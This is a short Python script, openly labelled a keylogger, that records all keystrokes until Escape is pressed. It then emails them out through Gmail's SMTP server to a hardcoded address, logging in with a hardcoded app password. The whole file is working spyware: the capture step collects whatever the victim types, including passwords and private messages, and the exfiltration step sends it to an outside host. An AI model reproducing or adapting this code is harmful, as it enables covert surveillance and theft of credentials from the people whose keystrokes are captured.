# Keylogger with mail exfiltration once esc key is pressed!
from smtplib import SMTP_SSL as SMTP
import keyboard
import os

keystrokes_list = []

events = keyboard.record(until='escape')
print('escaped')
for event in events:
    if event.event_type == keyboard.KEY_DOWN:
        keystrokes_list.append(event.name)
        
# ---------------- EMAIL EXFILTRATION -------------------
SMTPserver = 'smtp.gmail.com'
sender =     'testemail6841@gmail.com'
destination = ['testemail6841@gmail.com']
data = " ".join(keystrokes_list)

USERNAME = "testemail6841@gmail.com"
PASSWORD = "lsov clug ypdp cbjt" # App Password from gmail
            
from email.mime.text import MIMEText

msg = MIMEText(data, 'plain')
msg['Subject']= 'Log'
msg['From'] = sender # some SMTP servers will do this automatically, not 

with SMTP('smtp.gmail.com', 465) as smtp_server:
    smtp_server.login(USERNAME, PASSWORD)
    smtp_server.sendmail(sender, destination, msg.as_string())